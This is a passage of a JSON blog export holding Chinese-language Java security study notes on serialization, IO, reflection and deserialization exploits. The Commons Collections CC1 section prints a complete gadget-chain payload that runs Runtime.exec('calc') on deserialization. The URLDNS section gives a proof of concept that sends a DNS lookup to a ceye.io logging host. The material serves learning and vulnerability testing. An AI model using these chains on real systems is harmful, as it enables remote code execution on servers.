Object[]&#123;\"calc\"&#125;).transform(currentRuntime);\n\n我们在调用transform中发现这样一个名为ChainedTransformer方法，其部分代码如下\n\n可以看出这个transform正好是调用上一个的值传给下一个，因此我们可以用这个来实现将三个联合在一起，具体代码如下\nChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]&#123;\n        new InvokerTransformer(\"getMethod\",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;\"getRuntime\",null&#125;),\n        new InvokerTransformer(\"invoke\",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),\n        new InvokerTransformer(\"exec\",new Class[]&#123;String.class&#125;,new Object[]&#123;\"calc\"&#125;)\n&#125;);\nchainedTransformer.transform(Runtime.class);\n\n此时第一个问题就解决了。\n接下来看第二个问题，这里的两个if语句,首先看第一个if语句\nString name = memberValue.getKey();\nClass&lt;?> memberType = memberTypes.get(name);            \nif (memberType != null) &#123;  // i.e. member still exists\n\n它这个是判断memberType是否为空，这个memberType是构造函数中传入的annotation的成员变量，name是从我们遍历的Map中获取的Key，因此要绕过这个if，我们必须使得注解中的成员变量与map中的key值相同，我们之前赋的注解是Override,跟进看下\n\n可以发现它内部是没有成员变量的，那么这个if肯定是无法绕过的，因此我们这里修改注解为Retention,它的下面有一个变量为Value\n\n接下来，我们再修改Map中的Key值为value，具体代码如下\nmap.put(\"value\",\"bbb\");\nObject o = AnnotartionConstructer.newInstance(Retention.class,transformedMap);\n\n此时第一层if就成功绕过了，接下来看第二层if\n\nObject value = memberValue.getValue();\nif (!(memberType.isInstance(value) ||\n      value instanceof ExceptionProxy)) &#123;\n    memberValue.setValue(\n        new AnnotationTypeMismatchExceptionProxy(\n            value.getClass() + \"[\" + value + \"]\").setMember(\n                annotationType.members().get(name)));\n&#125;\n\nmemberType是一个Annotation，而Value是一个bbb，所以这里直接返回false，第二层if通过\n此时第二个问题解决。\n接下来看第三个问题\n现在的setValue传入的并非我们想要的，此时我们需要另一个transformer，ConstantTransformer类，其代码如下\npublic ConstantTransformer(Object constantToReturn) &#123;\n    super();\n    iConstant = constantToReturn;\n&#125;\npublic Object transform(Object input) &#123;\n        return iConstant;\n    &#125;\n\n可以发现它的transform不论接收什么，都会返回一个固定值。\n所以最终payload修改为\npublic class Main &#123;\n    public static void main(String[] args) throws Exception&#123;\n//        Class c = Runtime.class;\n//        Method getRuntime = c.getMethod(\"getRuntime\");\n//        Method execMethod = c.getMethod(\"exec\", String.class);\n//        execMethod.invoke(getRuntime.invoke(null,null),\"calc\");\n//        Method getRuntime =(Method) new InvokerTransformer(\"getMethod\",new Class[]&#123;String.class,String.class&#125;,new Object[]&#123;\"getRuntime\",null&#125;).transform(Runtime.class);\n//        Runtime currentRuntime = (Runtime) new InvokerTransformer(\"invoke\",new Class[]&#123;Object.class,Object.class&#125;,new Object[]&#123;null,null&#125;).transform(getRuntime);\n//        new InvokerTransformer(\"exec\",new Class[]&#123;String.class&#125;,new Object[]&#123;\"calc\"&#125;).transform(currentRuntime);\n        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]&#123;\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\"getMethod\",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;\"getRuntime\",null&#125;),\n                new InvokerTransformer(\"invoke\",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),\n                new InvokerTransformer(\"exec\",new Class[]&#123;String.class&#125;,new Object[]&#123;\"calc\"&#125;)\n        &#125;);\n//        InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\",new Class[]&#123;String.class&#125;,new Object[]&#123;\"calc\"&#125;);\n        HashMap map = new HashMap();\n        Map&lt;Object,Object> transformedMap =TransformedMap.decorate(map,null,chainedTransformer);\n        map.put(\"value\",\"bbb\");\n        Class AnnotationInvocationHandler = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\n        Constructor AnnotartionConstructer = AnnotationInvocationHandler.getDeclaredConstructor(Class.class,Map.class);\n        AnnotartionConstructer.setAccessible(true);\n        Object o = AnnotartionConstructer.newInstance(Target.class,transformedMap);\n        Serialize(o);\n        unserialize(\"ser.bin\");\n//        for (Map.Entry entry:transformedMap.entrySet())\n//        &#123;\n//            entry.setValue(Runtime.getRuntime());\n//        &#125;\n//         invokerTransformer.transform(Runtime.getRuntime());\n//        Runtime.getRuntime().exec(\"calc\");\n//        Runtime.getRuntime().exec(\"calc\");\n//        Runtime r = Runtime.getRuntime();\n//        Method getMethod =(Method) new InvokerTransformer(\"getMethod\",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;\"getRuntime\",null&#125;).transform(Runtime.class);\n//        Runtime r =(Runtime) new InvokerTransformer(\"invoke\",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(getMethod);\n//        new InvokerTransformer(\"exec\",new Class[]&#123;String.class&#125;,new Object[]&#123;\"calc\"&#125;).transform(r);\n\n//        Transformer[] transformers =new Transformer[]&#123;\n//                new ConstantTransformer(Runtime.class),\n//                new InvokerTransformer(\"getMethod\",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;\"getRuntime\",null&#125;),\n//                new InvokerTransformer(\"invoke\",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),\n//                new InvokerTransformer(\"exec\",new Class[]&#123;String.class&#125;,new Object[]&#123;\"calc\"&#125;)\n//        &#125;;\n\n\n//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\n//        chainedTransformer.transform(Runtime.class);\n//            Class c = Runtime.class;\n//            Method getRUntimeMethod = c.getMethod(\"getRuntime\",null);\n//            Runtime r = (Runtime) getRUntimeMethod.invoke(null,null);\n//            Method execMethod = c.getMethod(\"exec\", String.class);\n//            execMethod.invoke(r,\"calc\");\n\n\n    &#125;\n\n    public static void Serialize(Object obj) throws IOException &#123;\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));\n        oos.writeObject(obj);\n    &#125;\n\n    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123;\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"ser.bin\"));\n        Object obj = ois.readObject();\n        return obj;\n    &#125;\n&#125;\n\n\n参考https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.999.0.0\n","slug":"Java CC1","date":"2023-06-07T16:51:30.000Z","categories_index":"JAVA","tags_index":"JAVA安全","author_index":"quan9i"},{"id":"2c9429693145cc0d21b44994a72f05fa","title":"JAVA 序列化与反序列","content":"JAVA序列化与反序列化JAVA序列化是指把JAVA对象转换为字节序列的过程；反序列化是指把字节序列恢复为JAVA对象的过程。\n接下来首先看一个简单的例子。\n我们首先来自定义一下Main类，给它赋予两个变量，name和age，具体代码如下\npackage org.example;\n\n\nimport java.io.Serializable;\n\npublic class Main implements Serializable &#123;\n    private String name;\n    private int age;\n\n    public Main(String name, int age) &#123;\n        this.name = name;\n        this.age = age;\n    &#125;\n\n    public String getName() &#123;\n        return name;\n    &#125;\n\n    public void setName(String name) &#123;\n        this.name = name;\n    &#125;\n    @Override\n    public String toString()&#123;\n        return \"Main&#123;\" +\n                \"name='\"+name+'\\''+\n                \"age=\"+age+\n                '&#125;';\n    &#125;\n&#125;\n\n接下来自定义JAVA序列化函数，具体代码如下\npackage org.example;\n\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.io.ObjectOutput;\nimport java.io.ObjectOutputStream;\n\npublic class serialize &#123;\n    public static void serialize(Object obj) throws IOException&#123;\n        ObjectOutputStream oos= new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));\n        oos.writeObject(obj);\n    &#125;\n\n    public static void main(String[] args) throws Exception&#123;\n        Main main = new Main(\"aa\",22);\n        //System.out.println(main);\n        serialize(main);\n    &#125;\n&#125;\n\n这里呢，其实就是写了一个文件输出流，将写入的内容传至ser.bin中，而后调用了writeObject方法实现了序列化。\n而后定义主函数，实例化对象并传入name=aa,age=22，并序列化main对象。接下来运行此程序\n\n接下来再自定义一下反序列化函数，反序列化与序列化相反即可，把Output换成Input，把write改为read，具体代码如下\npackage org.example;\n\nimport java.io.*;\n\npublic class unserialize &#123;\n    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123;\n        ObjectInputStream ois= new ObjectInputStream(new FileInputStream(\"ser.bin\"));\n        Object obj = ois.readObject();\n        return obj;\n    &#125;\n    public static void main(String[] args) throws Exception&#123;\n        Main main = (Main) unserialize(\"ser.bin\");\n        System.out.println(main);\n    &#125;\n&#125;\n\n此时运行程序，可以发现成功对数据进行了反序列化并输出了数据\n\n可以发现主函数中有这样一段代码\npublic class Main implements Serializable \n\n他其实是实现了一个接口，如果没有这个**implements Serializable **，就无法实现正常的序列化\n\n序列化实现的一些特点1、静态成员变量不能被序列化\n序列化是针对对象属性的，而静态成员变量是属于类的\n2、transient标识的对象成员变量不参与序列化\n这个可以用上面的示例进行测试，我们在name前添加上transient\n\n接下来重新进行序列化和反序列化，可以发现\n\n此时的name变成了null\nJAVA反序列化安全问题为什么会产生漏洞服务端进行反序列化数据时，会自动调用类中的readObject代码，给予了攻击者在服务器上运行代码的能力\n可能形式1、入口类的readObject直接调用危险函数\n比如上述的例子中，我们重写readObject方法，添加一个弹计算器的指令\nprivate void readObject(ObjectInputStream ois) throws Exception,ClassNotFoundException&#123;\n    ois.defaultReadObject();\n    Runtime.getRuntime().exec(&quot;calc.exe&quot;);\n&#125;\n\n\n此时再进行序列化和反序列化\n\n成功弹出计算器\n2、入口类参数中包含可控类，该类含有危险方法，readObject时进行调用\n3、入口类参数中包含可控类，该类调用其他有危险方法的类，readObject时进行调用\n4、构造函数/静态代码块等类加载时隐式执行。\n共同条件 \n1、继承Serialize\n2、入口类source(重写readObject 参数类型广泛 最好是JDK自带的)\n3、调用链 gadget chain\n4、执行类 sink (rce、ssrf写文件等等)\n\n\n\n接下来以HashMap为例，说一下如何寻找可用类。\n首先它需要继承有Serializable类，因为没有Serializable就无法进行序列化\n\n可以看到类HashMap继承了Serializable\n接下来寻找入口类。\n点击Strcture，可以看到HashMap下的readObject类中存在这样一段代码\nfor (int i = 0; i &lt; mappings; i++) &#123;\n                @SuppressWarnings(\"unchecked\")\n                    K key = (K) s.readObject();\n                @SuppressWarnings(\"unchecked\")\n                    V value = (V) s.readObject();\n                putVal(hash(key), key, value, false, false);\n            &#125;\n\n\n重点其实就是对key和value进行了readObject函数处理，而后将这两个变量放进了hash函数中，接下来跟进此方法\n\n当key不为0时，就会给h赋值为hashCode函数处理过后的key方法\n符合入口类的条件，即重写 readObject 调用常见的函数\nURLDNS原理分析URLDNS是 ysoserial中⼀个利⽤链的名字，这里之所以选择它来进行相关讲解是因为他足够简单，但它其实不能称为利用链，因为参数并非可利用的命令，而是一个URL，同时它触发的结果也并非命令执行，而是一次DNS请求。但它有以下优点:\n1、使⽤ Java 内置的类构造，对第三⽅库没有依赖。\n2、在⽬标没有回显的时候，能够通过 DNS 请求得知是否存在反序列化漏洞。\n\n因此用它来测试反序列化漏洞是否存在是尤为合适的。\n我们可以在ysoserial查看它的利用链\nGadget Chain:\n  HashMap.readObject()\n    HashMap.putVal()\n      HashMap.hash()\n        URL.hashCode()\n\n只有寥寥几步，接下来跟着复现一下。\n常见的HTTP请求使用的是URL类，URL是由HashMap的Put方法产生的，所以我们这里先跟进Put方法\n\n从该方法中我们可以看出这里调用了hash()方法，所以接下来我们跟进这个方法\n\n这里可以看到hashCode处理的变量是Key，而Key则是我们上文hash中传入的参数，也就是我们之前写的内容\nhashmap.put(new URL(\"http://xxx\"),1);\n\n// 传进去两个参数，key = 前面那串网址，value = 1\n\n接下来我们跟进URL，看URL中的hashCode方法。\n\n可以发现当hashCode不等于-1时，直接返回hashCode，否则就会对handler进行另一个类的hashCode方法处理，接下来跟进这个hashCode函数\n\n可以发现对内容进行了getHostAddress方法处理，继续跟进\n\n根据主机名获取其IP地址，也就是对其发送了一次DNS请求。\n至此，可以看出总体链如下\n1、HashMap->readObject()\n2、HashMap->hash()\n3、URL->hashCode()\n4、URLStreamHandler->hashCode()\n5、URLStreamHandler->getHostAddress()\n\n\n\n接下来构造Poc进行DNS请求尝试。\nHashMap&lt;URL,Integer> hashmap= new HashMap&lt;URL,Integer>();   \nhashmap.put(new URL(\"http://s3moz8.ceye.io\"),1);\n\nserialize(hashmap);\n\n此时运行会发现，我们还没进行反序列化，在此时就直接收到DNS请求了，这是为啥呢，仔细看一下代码，会发现\nPUT->hash->hashCode()\n\n而URL类中的hashCode默认值为-1，此时到这里就会直接往下运行，也就是对URL发起了DNS请求。\n这样的话我们就无法判断是反序列化出来的URLDNS，还是序列化中的URLDNS，造成了干扰，此时我们该怎么办呢，我们可以看到这里的源头是因为**put()**，所以我们可以先不发送请求\n#Serialization.java\npackage org.example;\n\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.net.URL;\nimport java.util.HashMap;\n\npublic class Serialization &#123;\n    public static void Serialize(Object obj) throws IOException&#123;\n        ObjectOutputStream oos= new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));\n        oos.writeObject(obj);\n    &#125;\n\n    public static void main(String[] args) throws Exception&#123;\n        HashMap&lt;URL,Integer> hashmap= new HashMap&lt;URL,Integer>();\n        URL url = new URL(\"http://s3moz8.ceye.io\");\n        Class c = url.getClass();\n        Field hashcodefile = c.getDeclaredField(\"hashCode\");\n        hashcodefile.setAccessible(true);\n        hashcodefile.set(url,1234);\n        hashmap.put(url,1);\n// 这里把 hashCode 改为 -1； 通过反射的技术改变已有对象的属性\n        hashcodefile.set(url,-1);\n        Serialize(hashmap);\n    &#125;\n&#125;\n\n运行序列化文件，接下来运行反序列化文件，而后在ceye.io上查看是否有接收到DNS请求\n\n此时可以发现成功接收到请求，证明URLDNS链构造成功。\n总体方向就是反序列化调用hashmap的readobject，hashmap里的object里\n这样调用了putVal()，所以我们需要去控制这个值才能实现往下走，所以这个时候我们找到了\nput方法，这个就是我们这里为啥要put这个url，是为了控制key和value，然后往下走，\n\nhash里调用了key.hashCode，hash里面是key，而这个key是我们填入的URL，所以此时就来到了URL.hashCode\n，这个时候我们要想实现DNS请求，必须让他值为-1，所以，我们此时通过反射修改了hashCode值，修改它为-1，让他继续往下走，此时就来到了\n\n就会发送DNS请求。\n","slug":"JAVA序列化与反序列化","date":"2023-05-31T18:51:30.000Z","categories_index":"JAVA","tags_index":"JAVA安全","author_index":"quan9i"},{"id":"28fab77566c6f0e9ee58d916e868a3c4","title":"JAVA IO流","content":"前言向Drunkbaby师傅学习！\n在学习反序列化之前，首先要对输入输出流有一定的了解\nJAVA IO什么是IO，即Input和Output输入与输出，通过IO可以完成硬盘文件的读和写。\n流的传输过程：\n首先不管是输入还是输出，传输的两端都是文件和java的运行程序，所以如果想要在这二者之间进行传输，我们就需要将他们两个之间搭起来一个可以传输的通道，这样就可以实现流的传输。\n创建文件创建文件使用的是File类，这里具体的话有三种方式。三种方式使用的是同一种方法，使用其实三种方式都大同小异，接下来依次看看。\n第一种\n1、使用的方法是new File(String pathname),具体代码如下所示\npackage org.example;\n\nimport java.io.File;\nimport java.io.IOException;\n\n//根据路径创建一个File对象\npublic class Main &#123;\n    public static void main(String[] args) &#123;\n        creatreFile();\n    &#125;\n    public static void creatreFile()&#123;\n        File file = new File(\"src/main/java/org/example/1.txt\");//创建1.txt文件\n    try &#123;\n        file.createNewFile();\n        System.out.println(\"Success\");\n    &#125; catch (IOException e) &#123;\n        e.printStackTrace();\n    &#125;\n    &#125;\n&#125;\n\n\n\n\n可以看到成功写入。接下来看第二种方式\n第二种\n2、使用的方法是 new File(File parent, String child)，看似与上个相同，但实则多了一参数，而且第一个参数也变化了，示例如下\npackage org.example;\n\nimport java.io.File;\nimport java.io.IOException;\n\n//根据路径创建一个File对象\npublic class Main &#123;\n    public static void main(String[] args) &#123;\n        creatreFile();\n    &#125;\n    public static void creatreFile()&#123;\n        String Parentfile = \"src/main/java/org/example\";\n        File file =new File(Parentfile,\"2.txt\");\n        try &#123;\n            file.createNewFile();\n            System.out.println(\"Success\");\n        &#125; catch (IOException e) &#123;\n            e.printStackTrace();\n        &#125;\n    &#125;\n&#125;\n\n\nemmm，我感觉与第一个大同小异，只是表达方式简单变化了一下\n第三种\n3、使用的方法是 new File(File parent, String child)，与上个差不多，接下来看demo\npackage org.example;\n\nimport java.io.File;\nimport java.io.IOException;\n\n//根据路径创建一个File对象\npublic class Main &#123;\n    public static void main(String[] args) &#123;\n        creatreFile();\n    &#125;\n    public static void creatreFile()&#123;\n        String Parentfile = \"src/main/java/org/example\";\n        String filename = \"3.txt\";\n        File file =new File(Parentfile,filename);\n    try &#123;\n        file.createNewFile();\n        System.out.println(\"Success\");\n    &#125; catch (IOException e) &#123;\n        e.printStackTrace();\n    &#125;\n    &#125;\n&#125;\n\n读取文件其实就是调用一下File类的几个方法，具体如下\npackage org.example;\n\nimport java.io.File;\nimport java.io.IOException;\n\n//根据路径创建一个File对象\npublic class Main &#123;\n    public static void main(String[] args) &#123;\n        creatreFile();\n    &#125;\n    public static void creatreFile()&#123;\n        String Parentfile = \"src/main/java/org/example\";\n        File file =new File(Parentfile,\"2.txt\");\n        System.out.println(\"文件名为:\"+file.getName());\n        System.out.println(\"文件的绝对路径为：\" + file.getAbsolutePath());\n        System.out.println(\"文件的父级目录为：\" + file.getParent());\n        System.out.println(\"文件的大小(字节)为：\" + file.length());\n        System.out.println(\"这是不是一个文件：\" + file.isFile());\n        System.out.println(\"这是不是一个目录：\" + file.isDirectory());\n    &#125;\n&#125;\n\n\n\n\n这里因为没有在文件中写入内容，所以文件大小为0\n删除文件使用 的是file.delete(Filename)方法，具体demo如下\nimport java.io.File;\nimport java.io.IOException;\n\n//根据路径创建一个File对象\npublic class Main &#123;\n    public static void main(String[] args) &#123;\n        creatreFileDir();\n    &#125;\n\n    public static void creatreFileDir() &#123;\n        String fileD = \"src/main/java/org/example/\";\n        File file = new File(fileD,\"2.txt\");\n        try &#123;\n            file.delete();\n            System.out.println(\"success\");\n        &#125; catch (Exception e) &#123;\n            throw new RuntimeException(e);\n        &#125;\n    &#125;\n&#125;\n\n创建目录创建单级目录这里使用的方法是file.mkdir()，具体见demo\npackage org.example;\n\nimport java.io.File;\nimport java.io.IOException;\n\n//根据路径创建一个File对象\npublic class Main &#123;\n    public static void main(String[] args) &#123;\n        creatreFileDir();\n    &#125;\n\n    public static void creatreFileDir() &#123;\n        String fileD = \"src/main/java/org/example/FileDir\";\n        File file = new File(fileD);\n        try &#123;\n            file.mkdir();\n            System.out.println(\"success\");\n        &#125; catch (Exception e) &#123;\n            throw new RuntimeException(e);\n        &#125;\n    &#125;\n&#125;\n\n\n\n\n创建多级目录使用的方法是File.mkdirs()，具体demo如下\npackage org.example;\n\nimport java.io.File;\nimport java.io.IOException;\n\n//根据路径创建一个File对象\npublic class Main &#123;\n    public static void main(String[] args) &#123;\n        creatreFileDir();\n    &#125;\n\n    public static void creatreFileDir() &#123;\n        String fileD = \"src/main/java/org/example/FileDir/qwq2\";\n        File file = new File(fileD);\n        try &#123;\n            file.mkdirs();\n            System.out.println(\"success\");\n        &#125; catch (Exception e) &#123;\n            throw new RuntimeException(e);\n        &#125;\n    &#125;\n&#125;\n\n\n删除目录删除目录同删除文件相同，使用的是File.delete方法，但它只能删除空目录，所以在删除前需先清除文件\npackage org.example;\n\nimport java.io.File;\nimport java.io.IOException;\n\n//根据路径创建一个File对象\npublic class Main &#123;\n    public static void main(String[] args) &#123;\n        creatreFileDir();\n    &#125;\n\n    public static void creatreFileDir() &#123;\n        File fileD =new File(\"src/main/java/org/example/FileDir\");\n        System.out.println(fileD.delete()? \"Delete Successfully\":\"Delete failed\");\n    &#125;\n&#125;\n\n\n\n\nIO流分类按照操作数据单位不同分为：字节流和字符流\n字节流（8bit，适用于二进制文件）\n字符流（按字符，因编码不同而异，适用于文本文件）\n\n按照数据流流向不同分为：输入流和输出流\n按照流的角色不同分为：节点流，处理流/包装流\n\n\n\n抽象基类\n字节流\n字符流\n\n\n\n输入流\nInputStream\nReader\n\n\n输出流\nOutputStream\nWriter\n\n\n文件流函数FileInputStream读取文件分为两步\n1.将文件中的数据转换为流对象\n2.读取流对象的数据\n\n细分的话，可分为如下三步\n1、创建流对象\n2、读取流对象内部数据\n3、关闭流对象\n\n使用read方法读取文件，有关read方法的解释如下\nread() \n\tpublic int read() throws IOException \n\t从此输入流中读取一个数据字节。\n\t\n\t如果没有输入可用，则此方法将阻塞。 \n\t\n\t指定者： 类 InputStream 中的 read \n\t\n\t返回： 下一个数据字节；如果已到达文件末尾，则返回 -1。 \n\t\n\t抛出： IOException - 如果发生 I/O 错误。\nreads()\n允许在方法中添加一个字节数组。\n这种方式很有意思，当我们设置缓冲区的值为 8 时，若文件中的字符长度超过了 8，则会换行输出。这和上面的换行实际上是异曲同工。\n\n再回到之前我们讲的 Runtime 类进行命令执行的 Payload，在那里，我们设置的 Cache 缓冲区的值为 1024.\n\n读取文件Demo\npackage org.example;\n\n\nimport java.io.*;\n\n/**\n * Creator: yz\n * Date: 2019/12/4\n */\npublic class Main&#123;\n\n    public static void main(String[] args) throws IOException &#123;\n        File file = new File(\"C:\\\\WINDOWS\\\\system32\\\\drivers\\\\etc\\\\hosts\");\n\n        // 打开文件对象并创建文件输入流\n        FileInputStream fis = new FileInputStream(file);\n\n        // 定义每次输入流读取到的字节数对象\n        int a = 0;\n\n        // 定义缓冲区大小\n        byte[] bytes = new byte[1024];\n\n        // 创建二进制输出流对象\n        ByteArrayOutputStream out = new ByteArrayOutputStream();\n\n        // 循环读取文件内容\n        while ((a = fis.read(bytes)) != -1) &#123;\n            // 截取缓冲区数组中的内容，(bytes, 0, a)其中的0表示从bytes数组的\n            // 下标0开始截取，a表示输入流read到的字节数。\n            out.write(bytes, 0, a);\n        &#125;\n\n        System.out.println(out.toString());\n    &#125;\n\n&#125;\n\n这里简单介绍一下函数\nfis.read()方法是依次读取一个个字节数据，返回每个数据的整型，该方法的作用是每次读取流中的一个字节，如果需要读取流中的所有数据，需要使用循环读取。\nfis.read(bytes)此方法是就实现了将流对象fis中的数据读取到字节数组bytes中,该行代码的作用是将fis流中的数据读取出来，并依次存储到数组data中，返回值为实际读取的有效数据的个数。\n\nFileOutputStreampackage org.example;\n\n\nimport java.io.File;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\n\n/**\n * Creator: yz\n * Date: 2019/12/4\n */\npublic class Main &#123;\n\n    public static void main(String[] args) throws IOException &#123;\n        // 定义写入文件路径\n        File file = new File(\"D:/1.txt\");\n\n        // 定义待写入文件内容\n        String content = \"Hello World.\";\n\n        // 创建FileOutputStream对象\n        FileOutputStream fos = new FileOutputStream(file);\n\n        // 写入内容二进制到文件\n        fos.write(content.getBytes());\n        fos.flush();\n        fos.close();\n    &#125;\n\n&#125;\n\n\n\n\n","slug":"JAVA IO流","date":"2023-05-28T16:51:30.000Z","categories_index":"JAVA","tags_index":"JAVA安全","author_index":"quan9i"},{"id":"bcb3e11c6b94d1211dd6ffd71733ea77","title":"JAVA 反射机制","content":"前言拖了很久，才开始学习JAVA 安全相关，最近很是摆烂，希望能够快速进入学习状态，冲冲冲！\n同时说明一下，本文大多参考自Y4tacker大师傅的JavaSec，因此例子大多是引用的，大师傅们勿喷。\n定义什么是JAVA 反射。接下来引用一下Y4tacker大师傅的话\nJava反射机制是在运行状态时，对于任意一个类，都能够获取到这个类的所有属性和方法，对于任意一个对象，都能够调用它的任意一个方法和属性(包括私有的方法和属性)，这种动态获取的信息以及动态调用对象的方法的功能就称为java语言的反射机制。\n简单的说，就是通过java反射机制，我们可以获取任意类的成员方法、变量这些，同时，可以创建JAVA类实例，调用任意类方法。\n还有就是想说一下这里为什么称为反射，在JAVA中，我们可以这样理解：通过new一个对象而调用其中方法的，称为”正射”，而不通过new一个对象取得其中方法的，称为”反射”。\n学前需知反射的动态机制反射机制是java实现动态语言的关键，也就是通过反射机制实现类动态加载\n1、静态加载：编译时加载相关的类，如果没有就报错，依赖性过强\n2、动态加载：运行时加载需要的类，如果运行时不使用该类，即使不存在也不会报错，降低了依赖性。\n示例如下\nimport java.util.*;\nimport java.lang.reflect.*;\npublic class Main&#123;\n    public static void main(String[] args) throws Exception&#123;\n        Scanner Scanner = new Scanner(System.in);\n        System.out.println(\"请输入key\");\n        String key = Scanner.next();\n        switch (key)&#123;\n            case \"1\":\n                Dog dog = new dog();\n                dog.cry();\n                break;\n            case \"2\":\n                Class cls = Class.forName(\"Person\");\n                Object o = cls.newInstance();\n                Method m = o.getMethod(\"hi\");\n                m.invoke(o);\n                break;\n        &#125;\n    &#125;\n&#125;\n\n此时去运行javac Main.java会发现无法编译成功，因为dog类已经是静态加载机制，这个需要提前加载，而这里没有，故报错，而如果有Dog类，即使没有Person类，编译也不会报错，会正常生成class文件，但当运行时会报错。\n常用方法在JAVA的Lang包中存在一个名为Class的静态类，在JAVA程序编译加载某一个类时，JAVA.Lang.Class就会实例化出一个对象，这个对象存储了类的所有信息。因此，我们可以通过这个Class对象拿到这个类的信息。接下来我们先了解一些方法。\nforName()forName方法可以获取类中的所有属性包括类名。\n示例如下\nClass.forName(classname): 获取classname类中的所有属性\nClass qwq = Class.forName(\"java.lang.Runtime\");\n//获取Runtime类中的所有属性，并赋值给clazz类\n\nnewInstance()书接上文，我们在示例中将Runtime类中的所有属性赋值给了qwq类，接下来我们想要调用qwq类中的某个方法的话，需要三步\n1、对类进行实例化(实例化对象)\n2、获取方法\n3、执行方法\n\n接下来分步进行。\n第一步，是实例化对象，此时也就引入了我们的**newInstance()**方法，对该方法进行简单解释，此方法可以实例化对象，并触发类的构造方法。\n所以此时的话对象就创建完成了，接下来就是获取方法了。\ngetMethod()我们在获取完对象后，对对象中的Public方法获取的方式是采用*getMethod()*函数，这个函数的具体参数如下\ngetMethod(\"方法名，参数类型(如String.class)\")\n\n此时就可以获取到方法了，接下来我们只需要进行执行方法即可，此时也就引入了我们的最后一个函数\ninvolve()involve可以执行方法，如果是一个普通方法，则involve的第一个参数为该方法所在的对象，如果是静态方法则第一个参数是Null或者该方法所在的类，第二个参数为要执行方法的参数。\n上述只是一些常见的方法，并不是全部的，比如获取类的方法，不止有forName函数，接下来开始进一步讲解。\n获取类JAVA反射操作的是java.lang.Class对象，上文中提到过Class对象，在类被编译加载时，它会存储类的相关信息，所以我们这里需要首先获取到类。上述说了一个方法，forName方法，它并不是唯一的方法，还有两种常用的方法，具体如下\n1、getClass(): 当上下文中存在某个类的实例化对象，我们可以通getClass()方法直接获取它的类，示例如下:\nString s = \"qwq\";\nClass cla = s.getclass();\n\n2、类名.class: 如果已经加载了一个类，我们知道类中的一个静态变量或是其他，此时便可直接获取，示例如下:\nClass cla = String.class\n\n对于forName方法，获取类的方式如下\n3、Class.forName(\"完整类名\")，当我们知道一个类的完整类名时，可以通过静态方法Class.forName()获取\nClass cla = Class.forName(\"java.lang.String\") \n//获取java.lang.String的全部方法 \n\n获取字段上文中说了获取类的方法，接下来说一下获取字段的方式，获取字段的话，主要用到以下两个函数\ngetFields()：获得某个类的所有的公共（public）的字段，包括父类中的字段。\ngetDeclaredFields()：获得某个类的所有声明的字段，即包括public、private和proteced，但是不包括父类的申明字段。\n\n这里借用一下Y4大师傅的示例。\nimport java.lang.reflect.Field;\n\npublic class test &#123;\n    public static void main(String[] args) throws Exception &#123;\n        Class stiClass = StuInfo.class;\n        // 获取public字段\"age\":\n        System.out.println(stiClass.getField(\"age\"));\n        // 获取继承的public字段\"name\":\n        System.out.println(stiClass.getField(\"name\"));\n        // 获取private字段\"money\":\n        System.out.println(stiClass.getDeclaredField(\"money\"));\n        // 获得值,name.get里面参数需要该类对象，而不是.class\n        Field name = stiClass.getField(\"name\");\n        System.out.println(name.get(stiClass.newInstance()));\n        // 设置值\n        StuInfo stuInfo = new StuInfo();\n        Field money = stiClass.getDeclaredField(\"money\");\n        money.setAccessible(true);\n        money.set(stuInfo,2333333);\n        System.out.println(stuInfo);\n\n\n\n\n    &#125;\n&#125;\n\nclass StuInfo extends PersonInfo&#123;\n    public int age;\n    private int money;\n\n    @Override\n    public String toString() &#123;\n        return \"StuInfo&#123;\" +\n            \"name=\" + name +\n            \", money=\" + money +\n            '&#125;';\n    &#125;\n&#125;\n\nclass PersonInfo&#123;\n    public String name = \"quan9i\";\n&#125;\n\n这里需要说明的是**money.setAccessible(true);*这个语句，它是取消了money*变量的特权模式，本来money是private的，不可被更改，访问这些，而当有这个语句后，就变的与public相同了（小白个人观点，可能有误）。\n获取方法这里涉及了四个函数，具体如下所示\n1、Method getMethod(name, Class...)：获取某个public的方法（包括父类）\n2、Method getDeclaredMethod(name, Class...)：获取当前类的某个方法（不包括父类）\n3、Method[] getMethods()：获取所有public的方法（包括父类）\n4、Method[] getDeclaredMethods()：获取当前类的所有方法（不包括父类）\n\n示例如下\nString name = \"quan9i\";\nMethod substring = String.class.getMethod(\"substring\", int.class);\nSystem.out.println(substring.invoke(name,3));\n\n如果调用的方法是静态方法。那么invoke方法传入的第一个参数永远为null\n// 获取Integer.parseInt(String)方法，参数为String:\nMethod m = Integer.class.getMethod(\"parseInt\", String.class);\n// 调用该静态方法并获取结果:\nInteger n = (Integer) m.invoke(null, \"23333\");\nSystem.out.println(n);\n\n反射执行命令java.lang.Runtime因为有一个exec方法可以执行本地命令，所以在很多的payload中我们都能看到反射调用Runtime类来执行本地系统命令，通过学习如何反射Runtime类也能让我们理解反射的一些基础用法。\n执行的Payload如下\nClass.forName(\"java.lang.Runtime\").getMethod(\"exec\", 